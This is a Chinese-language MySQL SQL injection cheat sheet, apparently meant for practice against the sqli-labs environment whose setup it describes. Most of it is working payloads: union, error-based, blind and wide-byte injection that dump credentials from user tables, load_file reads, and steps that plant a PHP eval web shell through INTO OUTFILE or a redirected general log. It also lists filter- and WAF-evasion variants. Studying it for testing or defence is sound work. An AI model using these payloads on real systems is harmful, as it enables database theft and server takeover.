## MySQL注入

### 查询
```
# 查询数据库
show databases;

# 查询数据表
use test;
show tables;

# 查询数据库
select schema_name from information_schema.schemata;

# 查询数据表
select table_name from information_schema.tables where table_schema=0x74657374; // "test" 或 "test"的十六进制表示

# 判断列数
order by 1 根据第x列进行排序，如果x超过列数则报错

# 查询列
select column_name from information_schema.columns where table_name=0x7573657273;  // "users" 或 "users"的十六进制表示

# 具体查询某数据库、某表的列
select column_name from information_schema.columns where table_name=0x7573657273 and table_schema=0x74657374;

# 数据库版本查询
select @@version;
select version();
select /*!40000 version()*/

# 其他信息查询
select @@datadir;  // 查询数据库所在路径
select @@version_compile_os;  //查询操作系统
select system_user() //系统用户名 
select user() //用户名 
select current_user() //当前用户名 
select session_user() //连接数据库的用户名
select 1,host,user from mysql.user; //查询host与user
```
`information_schema`是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息。`SCHEMATA`表保存所有数据库信息；`TABLES`表保存数据库中的表信息。`COLUMNS`表保存了表的列信息
`/*!`后面跟的是版本，表示在X版本之上执行。上面表示的是在mysql4以上版本执行

### 注入类型
```
select * from users where id = 1;
select * from users where id = '1';
select * from users where id = "1";
select * from users where id = (1);
select * from users where id = ('1');
select * from users where id = ("1");
select * from users where username like '%adm%';
select * from users where username like ('%adm%');
```

### 联合注入
```
id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +
id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +
id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +
id=-2' union select 1,group_concat(username,0x7C,password),3 from users-- +
```
`limit N `返回N条记录;`limit N,M`相当于`limit M offset N`，即从第 N 条记录开始, 返回 M 条记录。

### 报错注入
```
1.floor()  向下取整:只返回值X的整数部分，小数部分舍弃
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复。
* 类似方法
ROUND()  四舍五入取整
CEILING() 向上取整

2.extractvalue()  MySQL 5.1.5版本中添加，对XML文档进行查询。使用XPath表示法从XML字符串中提取值
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()  MySQL 5.1.5版本中添加，返回替换的XML片段
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection() 几何对象，高版本中不适用
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint() 几何对象，高版本中不适用
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon() 几何对象，高版本中不适用
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon() 几何对象，高版本中不适用
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring() 几何对象，高版本中不适用
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring() 几何对象，高版本中不适用
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp() 溢出报错
select * from test where id=1 and exp(~(select * from(select user())a));
```

以updatexml为例
```
爆库：
updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +

爆表：
updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +

爆字段：
updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +

爆数据：
updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +
```

### 盲注
```
# 时间盲注
and if((substr((select user()),1,1)='r'),sleep(5),1);   // 为真就延迟
and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);
and case when (substr((select user()),1,1)="r") then sleep(3) else 1 end;
or if((substr((select user()),1,1)='r'),((select sleep(5) from information_schema.schemata as b)),1);-- +

# 布尔盲注
and substr((select user()),1,1)='r' -- +
and IFNULL((substr((select user()),1,1)='r'),0) -- +
and strcmp((substr((select user()),1,1)='r'),1) -- +
and 0=strcmp((substr((select user()),1,1)),'o');

```

### insert / delete / update 注入
```
# insert注入报错 （insert注入因为会写入到数据库中，所以会产生垃圾数据）
insert into admin (id,username,password) values (2,""or updatexml(1,concat(0x7e,(version())),0) or"","admin");

# insert盲注
insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',"admin");
insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',"admin");

# delete报错注入 （delete注入or右侧条件一定要为false,减少对数据库的影响）
delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);

# delete盲注
delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);
delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);

# update注入
update admin set id="5"+sleep(5)+"" where id=2;
```

### order by注入
```
# 布尔
select * from admin order by if(1=1,username,password);
select * from admin order by if((substr((select user()),1,1)='r1'),username,password);

# 盲注
select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);
select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);

# 报错
select * from admin order by (extractvalue(1,concat(0x3a,version())),1);
```

### 读写文件
```
# 查询是否具备读写条件，5.6.34版本以后secure_file_priv的值默认为NULL，即无法读写。需要手动将配置文件该值改为空。
show global variables like '%secure%';

# 读文件，文件名支持Hex或Char编码
select * from admin union select 1,hex(load_file('C:\\test.txt')),3;

# 读文件
create table test(test text);
insert into test(test) values (load_file('C:\\1.txt'));
select * from test;

# 写文件，outfile后跟绝对路径，并且要求路径下文件具备写权限
select * from admin where id =1 union select 1,'<?php eval($_POST[cmd]);?>',3 into outfile 'C:\\test.txt';

# 通过更改日志路径，查询写文件
set global general_log=on;
set global general_log_file='C://test.php';
select '<?php eval($_POST['cmd']) ?>';

# 堆叠查询写文件 （堆叠查询，通过;号分割多语句进行查询）
id=1%27;set global general_log=on;set global general_log_file='C://phpstudy//404.php';--+
id=1%27;select '<?php eval($_POST[404]) ?>';--+
```
`outfile`会在行末写入新行，而且会转义换行符。`dumpfile`导出完整文件，不会转义。

### 宽字节注入
`ASCII`码有127个字符，后来发现不够用，又扩展到了256个(扩展字符集，UTF-8)     
但是为了表示中文，设计了`GB2312`: 小于127的字符意义和ASCII相同。两个大于127的字符连在一起就表示一个汉字    
再后来，汉字实在太多，就更改只要第一个字节大于127就表示一个汉字，即`GBK`编码    

宽字节注入的核心，是GB2312、GBK、BIG5等需要两个字节编码，可能将两个ASCII字符误认为是一个宽字节字符    
例如将`xi'an`理解为`xian`，将`li'ang`理解为`liang`
GBK编码对照表: http://tools.jb51.net/table/gbk_table

在一些开发场景下，会将`'`这种敏感字符转译，在前面加个`\`。`\'`经过url编码，会变成`%5c%27`

大于127的字符，即从128开始，对应十六进制的0x81   
GBK首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），所以%df和%5C会结合认作一个字符；这样单引号就被闭合了（单引号逃逸）   
GB2312首字节范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c
```
%5c -> \
%27 -> '
%20 -> (空格)
%23 -> #
%3d -> =
```
可以从GBK编码表中挑选一个满足的字符例如%df，宽字节注入过程如下
```
%df%27 -> %df%5c%27 -> 運'
```

### 绕过
```
# 注释方法
/*xxxx*/  
/*/*xxxx*/
--空格
#
;%00

# and or 过滤
and -> &
or -> | 

# 数字过滤 1=1过滤
and ~1>1
and hex(1)>-1
and hex(1)>~1
and -2<-1
and ~1=1
and!!!1=1
and 1-1
and true
and 1

# union select过滤
union/*select*/
union/*!/*!11440select*/
union/*!11441/*!11440select*/
union/*!11440select*/
union/*!11440/**/%0aselect*/
union a%23 select
union all%23 select
union all%23%0a select
union %23%0aall select
union  -- 1%0a select
union  -- hex()%0a select
union(select 1,2,3)

数字代表版本号，需要遍历测试

# information_schema.schemata被过滤
`information_schema`.`schemata `  
information_schema/**/.schemata
information_schema/*!*/.schemata
information_schema%0a.schemata

# users被过滤，加数据库名绕过
security.users
security.`users`

# 盲注绕过
and!!!if((substr((select hex(user/**/(/*!*/))),1,1)>1),sleep/**/(/*!5*/),1)
and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1
/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)>1
and!!!substr((select user-- (1)%0a()),1,1)='r'
and!!!substr((select{x @@datadir}),1,1)='D'
and strcmp((substr((select /*from*/),2,1)),'0')
and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')
 and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))

# 报错注入绕过，过滤updatexml()
/*updatexml*/(1,1,1)
/*!11440updatexml*/(1,1,1)
/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
 | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
 xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
 `updatexml`(1,(select hex(user/**/(/**/))),1)
 `updatexml`(1,select `user`%0a(),1) 
 
 # from表名 被过滤
select from[user]
```

附录
1. sqli-labs环境搭建
```
docker search sqli-labs  //搜索sqli-labs
docker pull acgpiano/sqli-labs  //拉取镜像
docker images  //查看镜像
docker run -dt --name sqli-labs -p 8081:80 --rm acgpiano/sqli-labs  //后台运行镜像，docker端口映射到主机端口，执行后会返回一个ID号
docker exec -it ID号 /bin/bash  //进入docker容器
//参数解释：-dt  后台运行； --name  命名；-p 80:80  将后面的docker容器端口映射到前面的主机端口。
docker start sqli-labs  //启动
```

2. 常用mysql函数
```
CONCAT(): 字符串连接 CONCAT(string1,string2, ... );
CONCAT_WS(): 根据预定义的分隔符相连接字符串 CONCAT_WS(seperator,string1,string2, ... );
if(expre1，expre2，expre3): expre1为true时，返回expre2；否则返回expre3 
substr(string string,num start,num length): 截取字符串
substring(str, pos) 或 substring(str, pos, length) 后者类似substr
left(str, length): 从左截取字符串
right(str, length): 从右截取字符串
BENCHMARK(count,expr): 重复执行expr表达式count次，这个函数的返回值始终是0，但会消耗时间以测试执行效率
ascii(chr): 返回字符的ASCII值
hex(chr): 返回字符的hex值
STRCMP(str1, str2): 比较字符串，相等为0，str1大为1，str2大为-1
IFNULL(expression, alt_value): 判断表达式是否为NULL，是则返回第二个参数的值，否则返回表达式的值。
```

3. 基本语句
```
# 创建数据库
create database test;

# 创建数据表
create table users (id int, username varchar(255), password varchar(255));
```



